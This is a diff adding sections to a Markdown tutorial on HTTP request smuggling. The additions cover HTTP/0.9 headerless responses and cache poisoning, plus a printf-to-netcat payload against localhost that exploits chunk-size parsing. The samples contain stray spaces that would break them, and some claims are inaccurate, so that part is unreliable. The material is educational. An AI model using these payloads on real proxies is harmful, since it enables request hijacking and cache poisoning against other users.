@@ -1,4 +1,4 @@
-# HTTP-Smuggling 
+﻿# HTTP-Smuggling 
 ![20191205171217](https://user-images.githubusercontent.com/25066959/70326865-8d21ea00-1803-11ea-8362-e9a51d7937d2.jpeg)    
 
 ### Inspiration: In Defcon 27 in 2019, @James Kettle proposed HTTP Desync Attacks: Smashing into the Cell Next Door ), explaining how to use PayPal's vulnerabilities to be discovered using HTTP Smuggling technology.           
@@ -74,6 +74,34 @@ So smuggling
 ![Capture](https://user-images.githubusercontent.com/25066959/70369423-17f7f880-1887-11ea-9222-8346c4ad43f8.PNG)
 
 Therefore. When we send a vague HTTP request to the proxy server, the proxy server may consider this to be an HTTP request, and then forward it to the backend origin server, but the origin server After parsing and processing, only a part of it is considered as a normal request is ‘accepted’ but this includes the remaining part smuggled request. When this part affects the request of a normal user, an HTTP smuggling attack is implemented.
+
+#### Talking HTTP Versions 
+Http-smuggling is mainly due to the problem caused by HTTP / 0.9. Let's take a look at several examples of HTTP:    
+
+HTTP v1.1   
+```
+GET / foo HTTP / 1.1 \ r \ n 
+Host : example . Com \ r \ n
+```   
+
+HTTP v1.0   
+```
+GET / foo HTTP / 1.0 \ r \ n 
+\ r \ n
+```    
+
+HTTP v0.9    
+`GET / foo \ r \ n`   
+
+And HTTP / 0.9 request and response packets do not have the concept of headers, that is to say as follows:    
+![Capture](https://user-images.githubusercontent.com/25066959/70380808-d448d180-190e-11ea-8828-624c90bbac7f.PNG)
+
+Because HTTP / 0.9 response packets do not have headers, they are particularly interesting to use in HTTP Smuggling.     
+
+You can also do NoCache poisioning in 0.9 hidden response    
+![Capture](https://user-images.githubusercontent.com/25066959/70380830-4c16fc00-190f-11ea-8793-c9b31e623f10.PNG)
+if you want to read up on NoCache poisioning here https://www.youtube.com/watch?v=lY_Mf2Fv7kI
+
 
 ## The Attack
 
@@ -197,3 +225,27 @@ printf  'GET / HTTP / 1.1 \ r \ n' \
 '\ r \ n' \
 | nc -q3 127.0.0.1 8080
 ```
+
+### Size Issue
+You can also use some code block lengths to produce parsing differences, such as:    
+```
+printf  'GET / HTTP / 1.1 \ r \ n' \ 
+'Host: localhost \ r \ n' \ 
+'Transfer-Encoding: chunked \ r \ n' \ 
+'Dummy: Header \ r \ n' \ 
+'\ r \ n ' \ 
+' 0000000000000000000000000000042 \ r \ n ' \ 
+' \ r \ n ' \ 
+' GET / tmp / HTTP / 1.1 \ r \ n ' \ 
+' Host: localhost \ r \ n ' \ 
+' Transfer-Encoding: chunked \ r \ n ' \ 
+' \ r \ n ' \ 
+' 0 \ r \ n ' \ 
+' \ r \ n ' \ 
+| nc -q3 127.0.0.1 8080
+```
+so not all middleware will truncate the length of the block size. such as the example above. In which, `'0000000000000000000000000000042` and `00000000000000000` will be two requests. The block size of the first request is `0` and the first two request of `/tmp` will cause HTTP smuggling.    
+
+### CL-TE 
+In the next few attack methods, we can use some Labs provided by @portswigger to practice for us to deepen our understanding- HTTP request smuggling    
+(Remember to cancel the automatic update Content-Length function of BurpSuite before doing it.)   
